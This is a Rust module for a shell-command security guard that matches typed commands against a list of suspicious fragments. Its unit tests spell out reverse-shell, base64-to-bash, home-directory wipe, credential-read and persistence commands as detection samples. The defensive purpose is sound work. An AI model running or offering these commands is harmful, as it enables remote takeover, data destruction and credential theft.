//! V2-G Tier-1 AtomMatcher.
//!
//! Compiles `flagged_atoms.txt` (single source of truth, shared
//! with atty's Zig side via `@embedFile`) into a single
//! Aho-Corasick automaton at startup. Scans the typed command in
//! O(n) regardless of pattern count — drops in front of the
//! existing precise regex matchers so we can scale the pattern
//! corpus to thousands of atoms without per-classify latency
//! growth.
//!
//! Why a separate matcher rather than appending to the regex list:
//!   - `regex::Regex::new(big_alternation)` builds a single NFA
//!     too, but compile time and memory grow non-linearly with
//!     alternation count.
//!   - `aho_corasick::AhoCorasick` is purpose-built for "find any
//!     of N literal needles in a haystack" — same algorithmic
//!     complexity (O(haystack)) but designed for N in the
//!     thousands. Used by ripgrep.
//!   - Keeps the precise regex layer for "I'm sure this is bad"
//!     verdicts at high confidence; the AtomMatcher is "this
//!     command contains a suspicious fragment" at medium
//!     confidence. V2-J's accumulator (`Classifier::classify`)
//!     combines them via `1 - prod(1 - p_i)`.

use crate::protocol::{Category, ClassifyResult, Verdict};
use aho_corasick::{AhoCorasick, AhoCorasickBuilder, MatchKind};

const FLAGGED_ATOMS_TXT: &str =
    include_str!("../../src/modules/security_guard/data/flagged_atoms.txt");

/// Parse `flagged_atoms.txt` into the raw atom list. Comments
/// (`#`-prefixed) and blank lines are stripped. The order in the
/// file is preserved so reproducible match positions are
/// possible — `AhoCorasick` itself returns the lowest match
/// offset, so deterministic output is the matcher's invariant.
pub fn parse_atoms() -> Vec<&'static str> {
    FLAGGED_ATOMS_TXT
        .lines()
        .map(|l| l.trim())
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .collect()
}

pub struct AtomMatcher {
    /// The compiled DFA. Holds the atom strings internally; we
    /// keep a parallel `Vec` for the verdict reason text.
    ac: AhoCorasick,
    atoms: Vec<&'static str>,
}

/// What an `AtomMatcher::find_first` call returns. `byte_offset`
/// is the start of the match inside the input — V2-H's sliding-
/// context-window code uses it to slice a `[-64, +256]` block
/// for the SLM tokeniser. Stays in bytes (not chars) so the
/// caller can index directly into `&str` after a UTF-8 check.
#[derive(Debug, Clone)]
pub struct AtomHit {
    pub atom: &'static str,
    pub byte_offset: usize,
    /// `byte_offset + atom.len()` — kept for the V2-H sliding-context-
    /// window code that slices `command[offset..end]` to feed the SLM
    /// a localized snippet. Current call sites read `byte_offset`
    /// only and derive the end inline from `atom.len()`; this field
    /// is dead at the call site today. Keeping it in the struct
    /// avoids a wider refactor when the SLM slicer learns to span
    /// multiple atom hits.
    #[allow(dead_code)]
    pub byte_end: usize,
}

impl AtomMatcher {
    /// Build the AC automaton from the embedded data file. Cost
    /// is paid once at startup; for the ~40 seed atoms it's
    /// sub-millisecond. The matcher is then a Send+Sync read-only
    /// value — share via `Arc` to all classifier threads.
    pub fn new() -> Self {
        Self::with_atoms(parse_atoms())
    }

    /// Test seam — accepts a custom atom list. The production
    /// constructor is `new()` which reads the bundled data file.
    pub fn with_atoms(atoms: Vec<&'static str>) -> Self {
        // LeftmostLongest: among all patterns that start at the
        // leftmost match position, the longest wins. Order in the
        // data file doesn't affect the match — only pattern length
        // does. If "nc -e" and "nc -e /bin/sh" both match at the
        // same offset, the longer wins.
        let ac = AhoCorasickBuilder::new()
            .match_kind(MatchKind::LeftmostLongest)
            .build(&atoms)
            .expect("aho-corasick build over comptime-known atoms cannot fail");
        Self { ac, atoms }
    }

    /// Walk the input for the first atom hit. Returns None when
    /// no atom matches.
    ///
    /// Today's classify dispatch uses `find_all` for accumulator
    /// math, so this method is dead at the call site. Kept as part
    /// of the public matcher API: future single-hit consumers
    /// (e.g. a "fast path" for incognito mode that skips accumulator
    /// work) should use this without re-implementing the pattern-id
    /// → atom lookup. Reachable from `cargo test atom_matcher`.
    #[allow(dead_code)]
    pub fn find_first(&self, input: &str) -> Option<AtomHit> {
        let m = self.ac.find(input)?;
        let atom = self
            .atoms
            .get(m.pattern().as_usize())
            .copied()
            .expect("aho-corasick pattern id out of bounds of self.atoms — invariant broken");
        Some(AtomHit {
            atom,
            byte_offset: m.start(),
            byte_end: m.end(),
        })
    }

    /// Walk the input for ALL non-overlapping atom hits. Used by
    /// V2-J's accumulator — multiple atoms in a single command
    /// combine via independent-probability math (1 - prod(1-p)),
    /// so each hit needs to be visible. The underlying iterator
    /// is `LeftmostLongest`, so overlapping atoms resolve to the
    /// longest at each match position (e.g. `nc -e /bin/sh` wins
    /// over `nc -e` at the same offset).
    pub fn find_all(&self, input: &str) -> Vec<AtomHit> {
        self.ac
            .find_iter(input)
            .map(|m| {
                let atom = self.atoms.get(m.pattern().as_usize()).copied().expect(
                    "aho-corasick pattern id out of bounds of self.atoms — invariant broken",
                );
                AtomHit {
                    atom,
                    byte_offset: m.start(),
                    byte_end: m.end(),
                }
            })
            .collect()
    }

    /// Convert an atom hit into a daemon verdict. Confidence is
    /// medium (0.6) because the atom matcher's job is BROAD
    /// detection — the SLM's job is the disambiguating deep
    /// check. The trust-cache hash keys on the atom itself, so
    /// trusting one occurrence of `nc -e` doesn't blanket-trust
    /// every other atom.
    pub fn hit_to_result(&self, hit: &AtomHit, command: &str) -> ClassifyResult {
        let _ = command;
        ClassifyResult {
            verdict: Verdict::Warn,
            // Re-use CurlPipeSh as the placeholder category until
            // the protocol grows a dedicated AtomMatch variant.
            // The verdict reason carries the actual atom, so atty
            // surfaces useful detail in the banner regardless of
            // the category bucket.
            category: Category::CurlPipeSh,
            confidence: 0.6,
            reason: format!("AtomMatcher flagged `{}`", hit.atom),
            matched: hit.atom.to_owned(),
        }
    }

    /// Returns the count of compiled atoms — exposed for the
    /// startup log line and for the V2-I fetcher's "did the
    /// refresh actually grow the corpus?" sanity check.
    /// Currently only consumed by tests; the startup log path lands
    /// in a follow-up. `#[allow(dead_code)]` until then.
    #[allow(dead_code)]
    pub fn atom_count(&self) -> usize {
        self.atoms.len()
    }

    /// Returns a sorted snapshot of every atom currently compiled
    /// into the matcher. Used by `atty-guard atoms list --system`
    /// to show operators what the always-on baseline corpus
    /// catches. Allocates — not for hot-path use.
    pub fn atoms_snapshot(&self) -> Vec<String> {
        let mut v: Vec<String> = self.atoms.iter().map(|s| (*s).to_owned()).collect();
        v.sort();
        v
    }
}

impl Default for AtomMatcher {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_drops_comments_and_blanks() {
        let atoms = parse_atoms();
        assert!(atoms.len() >= 20, "expected ≥ 20 seed atoms");
        for a in &atoms {
            assert!(!a.is_empty(), "blank line leaked");
            assert!(!a.starts_with('#'), "comment leaked: {a}");
        }
    }

    #[test]
    fn matcher_finds_reverse_shell_atom() {
        let m = AtomMatcher::new();
        let hit = m
            .find_first("python3 -c 'import os; os.system(\"nc -e /bin/sh 10.0.0.1 4444\")'")
            .expect("nc -e should be flagged");
        assert_eq!(hit.atom, "nc -e");
        assert!(hit.byte_offset > 0, "offset should point INTO the line");
    }

    #[test]
    fn matcher_finds_base64_decode_atom() {
        let m = AtomMatcher::new();
        let hit = m.find_first("echo ZGFuZ2Vy | base64 -d | bash");
        assert!(hit.is_some(), "base64 -d should be flagged");
    }

    #[test]
    fn matcher_finds_devtcp_atom() {
        let m = AtomMatcher::new();
        let hit = m.find_first("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
        assert!(hit.is_some(), "/dev/tcp/ should be flagged");
    }

    #[test]
    fn matcher_clean_command_no_hit() {
        let m = AtomMatcher::new();
        assert!(m.find_first("ls -la").is_none());
        assert!(m.find_first("git status").is_none());
        assert!(m.find_first("cargo build --release").is_none());
    }

    #[test]
    fn matcher_chmod_setuid_atom() {
        let m = AtomMatcher::new();
        assert!(m.find_first("chmod +s /tmp/payload").is_some());
        assert!(m.find_first("chmod u+s ./drop").is_some());
    }

    #[test]
    fn matcher_copy_fail_af_alg_atoms() {
        // CVE-2026-31431 / copy.fail PoC shapes. The AF_ALG socket
        // creation isn't shell-visible at the syscall layer, but
        // a published PoC one-liner that names the family / module
        // is. Pins the three atoms shipped for this incident; their
        // section in flagged_atoms.txt cites the rationale.
        let m = AtomMatcher::new();
        assert!(m
            .find_first(r#"python -c "import socket; s = socket.socket(socket.AF_ALG, ...)""#)
            .is_some());
        assert!(m
            .find_first("strace -e trace=af_alg_setkey ./exploit")
            .is_some());
        assert!(m
            .find_first("modprobe algif_aead && ./poc")
            .is_some());
    }

    #[test]
    fn matcher_shai_hulud_dead_man_atoms() {
        // Sep-2025 → May-2026 npm-worm wave's dead-man switch:
        // `rm -rf ~/` and its four shell-expansion variants.
        let m = AtomMatcher::new();
        assert!(m.find_first("rm -rf ~/").is_some());
        assert!(m.find_first("rm -rf $HOME").is_some());
        assert!(m.find_first("rm -rf ${HOME}").is_some());
        assert!(m.find_first(r#"rm -rf "$HOME""#).is_some());
        assert!(m.find_first("rm -rf /home/alice").is_some());
    }

    #[test]
    fn matcher_shai_hulud_credential_harvest_atoms() {
        // Credential-read shapes from the worm's harvest stage.
        let m = AtomMatcher::new();
        assert!(m.find_first("cat ~/.aws/credentials").is_some());
        assert!(m.find_first("base64 ~/.npmrc | curl ...").is_some());
        assert!(m.find_first("cp ~/.ssh/id_rsa /tmp/k").is_some());
        assert!(m.find_first("cat ~/.ssh/id_ed25519.pub").is_some());
        assert!(m.find_first("xxd ~/.ssh/id_ecdsa").is_some());
        // /proc/self/mem covers self-scrape. Cross-process
        // /proc/<pid>/mem is intentionally NOT an atom (Aho-Corasick
        // has no wildcards); the eBPF V2-G openat() tracepoint
        // catches the <pid> form at the kernel layer.
        assert!(m.find_first("cat /proc/self/mem > /tmp/dump").is_some());
    }

    #[test]
    fn matcher_shai_hulud_persistence_atoms() {
        // systemd-user daemon install — the worm's 60s poller is a
        // systemd-user service. All three persistence atoms get
        // exercised so a future drop of any one fails this test.
        let m = AtomMatcher::new();
        assert!(m
            .find_first("systemctl --user enable evil.service")
            .is_some());
        assert!(m
            .find_first("systemctl --user daemon-reload")
            .is_some());
        assert!(m.find_first("loginctl enable-linger alice").is_some());
    }

    #[test]
    fn matcher_offset_is_match_start() {
        let m = AtomMatcher::with_atoms(vec!["nc -e"]);
        let cmd = "do something else then nc -e /bin/sh";
        let hit = m.find_first(cmd).unwrap();
        assert_eq!(&cmd[hit.byte_offset..hit.byte_end], "nc -e");
    }

    #[test]
    fn matcher_leftmost_longest_resolves_overlap() {
        let m = AtomMatcher::with_atoms(vec!["nc -e", "nc -e /bin/sh"]);
        let cmd = "nc -e /bin/sh 10.0.0.1";
        let hit = m.find_first(cmd).unwrap();
        // LeftmostLongest picks the longer atom when their starts
        // coincide. Ensures we hand the SLM the most-specific
        // matched substring.
        assert_eq!(hit.atom, "nc -e /bin/sh");
    }

    #[test]
    fn matcher_find_all_returns_every_non_overlapping_hit() {
        // V2-J: the accumulator needs every atom that fired,
        // not just the first. Two distinct atoms at different
        // offsets both surface.
        let m = AtomMatcher::with_atoms(vec!["nc -e", "/dev/tcp/"]);
        let hits = m.find_all("bash -i >& /dev/tcp/10.0.0.1/4444 && nc -e /bin/sh");
        assert_eq!(hits.len(), 2);
        let atoms: Vec<&str> = hits.iter().map(|h| h.atom).collect();
        assert!(atoms.contains(&"/dev/tcp/"));
        assert!(atoms.contains(&"nc -e"));
        // Offsets must point INTO the input and be in source order.
        assert!(hits[0].byte_offset < hits[1].byte_offset);
    }

    #[test]
    fn matcher_find_all_clean_command_is_empty() {
        let m = AtomMatcher::new();
        assert!(m.find_all("ls -la").is_empty());
        assert!(m.find_all("").is_empty());
    }

    #[test]
    fn matcher_hit_to_result_carries_atom_in_reason() {
        let m = AtomMatcher::new();
        let hit = m.find_first("base64 -d <<< $payload | sh").unwrap();
        let cmd = "base64 -d <<< $payload | sh";
        let r = m.hit_to_result(&hit, cmd);
        assert!(matches!(r.verdict, Verdict::Warn));
        assert!(r.reason.contains("base64 -d"));
        assert!(r.confidence > 0.5 && r.confidence < 1.0);
    }

    #[test]
    fn matcher_atom_count_matches_parser() {
        let m = AtomMatcher::new();
        assert_eq!(m.atom_count(), parse_atoms().len());
    }
}
